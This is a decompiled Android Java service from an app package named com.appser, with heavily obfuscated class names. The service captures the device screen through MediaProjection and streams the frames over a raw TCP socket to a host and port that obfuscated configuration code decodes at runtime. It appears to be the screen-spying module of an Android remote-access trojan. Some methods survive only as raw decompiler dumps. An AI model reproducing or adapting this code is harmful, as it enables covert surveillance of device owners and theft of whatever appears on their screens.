package com.appser;

import android.app.Service;
import android.content.Intent;
import android.hardware.display.VirtualDisplay;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.view.WindowManager;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

public class gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 extends Service {
    static final String ACTION_RECORD = "com.appser.verapq.RECORD";
    static final String ACTION_SHUTDOWN = "com.appser.verapq.SHUTDOWN";
    private static final String CHANNEL_WHATEVER = "Scaning";
    static final String EXTRA_RESULT_CODE = "resultCode";
    static final String EXTRA_RESULT_INTENT = "resultIntent";
    public static int FPS = 0;
    /* access modifiers changed from: private */
    public static boolean ISON = false;
    private static final int NOTIFY_ID = 9906;
    public static String PID = null;
    public static int Q = 0;
    static final int VIRT_DISPLAY_FLAGS = 9;
    /* access modifiers changed from: private */
    public static Socket sk;
    public static Object syc = new Object();
    public boolean Lo = false;
    public List<byte[]> bts = new ArrayList();
    public boolean ctd = false;
    private Handler handler;
    private final HandlerThread handlerThread = new HandlerThread(getClass().getSimpleName(), 10);
    private containedacandidatearegistrargdepositsbveteransguardiantjackohardcovernsatrmapshmanagevtommyb21 it;
    private MediaProjectionManager mgr;
    /* access modifiers changed from: private */
    public OutputStream out;
    private MediaProjection projection;
    private int resultCode;
    private Intent resultData;
    public boolean usd = false;
    /* access modifiers changed from: private */
    public VirtualDisplay vdisplay;
    private WindowManager wmgr;

    public void onCreate() {
        super.onCreate();
        this.mgr = (MediaProjectionManager) getSystemService("media_projection");
        this.wmgr = (WindowManager) getSystemService("window");
        this.handlerThread.start();
        this.handler = new Handler(this.handlerThread.getLooper());
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        if (intent.getAction() == null) {
            this.resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, 1337);
            this.resultData = (Intent) intent.getParcelableExtra(EXTRA_RESULT_INTENT);
            Q = intent.getIntExtra("Q", 10);
            FPS = intent.getIntExtra("F", 5);
            PID = intent.getStringExtra("P");
            foregroundify();
            return 2;
        } else if (ACTION_RECORD.equals(intent.getAction())) {
            if (this.resultData != null) {
                FindNewIcon();
                return 2;
            }
            startActivity(new Intent(this, SCRActivity.class).addFlags(268435456));
            return 2;
        } else if (!ACTION_SHUTDOWN.equals(intent.getAction())) {
            return 2;
        } else {
            ISON = false;
            stopCapture();
            stopForeground(true);
            stopSelf();
            return 2;
        }
    }

    public void onDestroy() {
        stopCapture();
        super.onDestroy();
    }

    public IBinder onBind(Intent intent) {
        throw new IllegalStateException("Binding not supported.");
    }

    public void pr() {
        new Thread(new Runnable() {
            /* JADX WARNING: Failed to process nested try/catch */
            /* JADX WARNING: Missing exception handler attribute for start block: B:17:0x009f */
            /* JADX WARNING: Removed duplicated region for block: B:28:? A[ExcHandler: OutOfMemoryError (unused java.lang.OutOfMemoryError), SYNTHETIC, Splitter:B:4:0x0023] */
            /* Code decompiled incorrectly, please refer to instructions dump. */
            public void run() {
                /*
                    r7 = this;
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r0 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this
                    android.content.Context r0 = r0.getApplicationContext()
                    java.lang.String r1 = "SCH"
                    java.lang.String r2 = "720"
                    java.lang.String r0 = com.appser.MySettings.read(r0, r1, r2)
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r1 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this
                    android.content.Context r1 = r1.getApplicationContext()
                    java.lang.String r2 = "SCW"
                    java.lang.String r3 = "1080"
                    java.lang.String r1 = com.appser.MySettings.read(r1, r2, r3)
                L_0x001c:
                    boolean r2 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.ISON
                    if (r2 == 0) goto L_0x00da
                    r2 = 0
                    boolean r3 = com.appser.outerypatientsivaliumgacquisitionsacasiootreatyqintegratingoeligibleotransactionmleonegboringj4.q     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    r4 = 1
                    if (r3 == 0) goto L_0x00ba
                    r3 = 0
                    java.lang.Object r5 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.syc     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    monitor-enter(r5)     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r6 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ all -> 0x00b7 }
                    java.util.List<byte[]> r6 = r6.bts     // Catch:{ all -> 0x00b7 }
                    int r6 = r6.size()     // Catch:{ all -> 0x00b7 }
                    if (r6 <= 0) goto L_0x0047
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r3 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ all -> 0x00b7 }
                    java.util.List<byte[]> r3 = r3.bts     // Catch:{ all -> 0x00b7 }
                    java.lang.Object r3 = r3.get(r2)     // Catch:{ all -> 0x00b7 }
                    byte[] r3 = (byte[]) r3     // Catch:{ all -> 0x00b7 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r6 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ all -> 0x00b7 }
                    java.util.List<byte[]> r6 = r6.bts     // Catch:{ all -> 0x00b7 }
                    r6.remove(r2)     // Catch:{ all -> 0x00b7 }
                L_0x0047:
                    monitor-exit(r5)     // Catch:{ all -> 0x00b7 }
                    if (r3 == 0) goto L_0x00d0
                    java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    r5.<init>()     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.lang.String r6 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.s_safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5_cr     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    r5.append(r6)     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.lang.String r6 = ":"
                    r5.append(r6)     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    r5.append(r1)     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.lang.String r6 = ":"
                    r5.append(r6)     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    r5.append(r0)     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.lang.String r6 = ":"
                    r5.append(r6)     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.lang.String r6 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.PID     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    r5.append(r6)     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.lang.String r5 = r5.toString()     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    byte[] r3 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.cementyfattyvshoppingcomrmetalsomezmetadataknightscsyncxknowgallocationlconsistentlylsicnmistakeq37(r5, r3)     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.net.Socket r5 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.sk     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    int r6 = r3.length     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    r5.setSendBufferSize(r6)     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r5 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.net.Socket r6 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.sk     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.io.OutputStream r6 = r6.getOutputStream()     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.io.OutputStream unused = r5.out = r6     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r5 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.io.OutputStream r5 = r5.out     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    int r6 = r3.length     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    r5.write(r3, r2, r6)     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r3 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    java.io.OutputStream r3 = r3.out     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    r3.flush()     // Catch:{ Exception -> 0x009f, OutOfMemoryError -> 0x00d0 }
                    goto L_0x00d0
                L_0x009f:
                    boolean unused = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.ISON = r2     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r3 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    r3.stopCapture()     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r3 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    r3.stopForeground(r4)     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r3 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    r3.stopSelf()     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r3 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    r3.di()     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    goto L_0x00d0
                L_0x00b7:
                    r3 = move-exception
                    monitor-exit(r5)     // Catch:{ all -> 0x00b7 }
                    throw r3     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                L_0x00ba:
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r3 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    r3.stopCapture()     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r3 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    r3.stopForeground(r4)     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22 r3 = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    r3.stopSelf()     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    boolean unused = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.ISON = r2     // Catch:{ Exception -> 0x00cd, OutOfMemoryError -> 0x00d0 }
                    goto L_0x00d0
                L_0x00cd:
                    boolean unused = com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.ISON = r2
                L_0x00d0:
                    r2 = 1
                    java.lang.Thread.sleep(r2)     // Catch:{ InterruptedException -> 0x00d7 }
                    goto L_0x001c
                L_0x00d7:
                    goto L_0x001c
                L_0x00da:
                    return
                */
                throw new UnsupportedOperationException("Method not decompiled: com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.AnonymousClass1.run():void");
            }
        }).start();
    }

    public void FindNewIcon() {
        new Thread(new Runnable() {
            public void run() {
                int i = 0;
                do {
                    if (i >= 3) {
                        gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.stopCapture();
                    }
                    try {
                        InetSocketAddress inetSocketAddress = new InetSocketAddress(InetAddress.getByName(safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.raisefmicemmexicoxwordpressggraphicyropexrestorationsjessicaiallahgthreadedjtexasrsocksjknowsf40(advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.Host)), Integer.parseInt(safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.raisefmicemmexicoxwordpressggraphicyropexrestorationsjessicaiallahgthreadedjtexasrsocksjknowsf40(advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.Port)));
                        Socket unused = gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.sk = new Socket();
                        gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.sk.setSoTimeout(0);
                        gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.sk.setKeepAlive(true);
                        gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.sk.setTcpNoDelay(true);
                        gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.sk.connect(inetSocketAddress, 60000);
                        gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.ctd = gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.sk.isConnected();
                        if (gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.ctd) {
                            OutputStream unused2 = gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.out = gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.sk.getOutputStream();
                            gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.Lo = true;
                            boolean unused3 = gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.ISON = true;
                            gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.pr();
                            gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.startCapture();
                            return;
                        }
                    } catch (UnknownHostException unused4) {
                        gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.di();
                    } catch (SocketException unused5) {
                        gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.di();
                    } catch (Exception unused6) {
                        gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.di();
                    }
                    try {
                        Thread.sleep(1);
                    } catch (InterruptedException unused7) {
                    }
                    i++;
                } while (!gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.ctd);
            }
        }).start();
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Can't wrap try/catch for region: R(13:0|1|2|3|4|5|6|7|8|9|10|12|(4:14|15|16|18)(1:19)) */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0008 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x000d */
    /* JADX WARNING: Missing exception handler attribute for start block: B:7:0x0016 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:9:0x001f */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x002a A[SYNTHETIC, Splitter:B:14:0x002a] */
    /* JADX WARNING: Removed duplicated region for block: B:19:? A[RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void di() {
        /*
            r1 = this;
            r0 = 0
            r1.Lo = r0
            java.net.Socket r0 = sk     // Catch:{ IOException | SocketException -> 0x0008 }
            r0.shutdownOutput()     // Catch:{ IOException | SocketException -> 0x0008 }
        L_0x0008:
            java.net.Socket r0 = sk     // Catch:{ IOException | SocketException -> 0x000d }
            r0.shutdownInput()     // Catch:{ IOException | SocketException -> 0x000d }
        L_0x000d:
            java.net.Socket r0 = sk     // Catch:{ IOException | SocketException -> 0x0016 }
            java.io.OutputStream r0 = r0.getOutputStream()     // Catch:{ IOException | SocketException -> 0x0016 }
            r0.close()     // Catch:{ IOException | SocketException -> 0x0016 }
        L_0x0016:
            java.net.Socket r0 = sk     // Catch:{ IOException | SocketException -> 0x001f }
            java.io.InputStream r0 = r0.getInputStream()     // Catch:{ IOException | SocketException -> 0x001f }
            r0.close()     // Catch:{ IOException | SocketException -> 0x001f }
        L_0x001f:
            java.net.Socket r0 = sk     // Catch:{ IOException | SocketException -> 0x0025 }
            r0.close()     // Catch:{ IOException | SocketException -> 0x0025 }
            goto L_0x0026
        L_0x0025:
        L_0x0026:
            java.io.OutputStream r0 = r1.out
            if (r0 == 0) goto L_0x0030
            r0.close()     // Catch:{ IOException | SocketException -> 0x002d }
        L_0x002d:
            r0 = 0
            r1.out = r0
        L_0x0030:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.di():void");
    }

    /* access modifiers changed from: package-private */
    public WindowManager getWindowManager() {
        return this.wmgr;
    }

    /* access modifiers changed from: package-private */
    public Handler getHandler() {
        return this.handler;
    }

    /* access modifiers changed from: package-private */
    public void processImage(final byte[] bArr) {
        new Thread() {
            public void run() {
                try {
                    if (gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.ctd) {
                        synchronized (gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.syc) {
                            gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.bts.add(bArr);
                        }
                    }
                } catch (Exception unused) {
                }
            }
        }.start();
    }

    /* access modifiers changed from: private */
    public void stopCapture() {
        MediaProjection mediaProjection = this.projection;
        if (mediaProjection != null) {
            mediaProjection.stop();
            this.vdisplay.release();
            this.projection = null;
        }
    }

    /* access modifiers changed from: private */
    public void startCapture() {
        this.projection = this.mgr.getMediaProjection(this.resultCode, this.resultData);
        this.it = new containedacandidatearegistrargdepositsbveteransguardiantjackohardcovernsatrmapshmanagevtommyb21(this);
        AnonymousClass4 r0 = new MediaProjection.Callback() {
            public void onStop() {
                gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.this.vdisplay.release();
            }
        };
        this.vdisplay = this.projection.createVirtualDisplay("andshooter", this.it.getWidth(), this.it.getHeight(), getResources().getDisplayMetrics().densityDpi, 9, this.it.getSurface(), (VirtualDisplay.Callback) null, this.handler);
        this.projection.registerCallback(r0, this.handler);
    }

    private void foregroundify() {
        startService(new Intent(this, gladnspotqencourageszdragonlcharacternplaystationafinancialhreservestmasztextileslschoollgeneratesv22.class).setAction(ACTION_RECORD));
    }
}
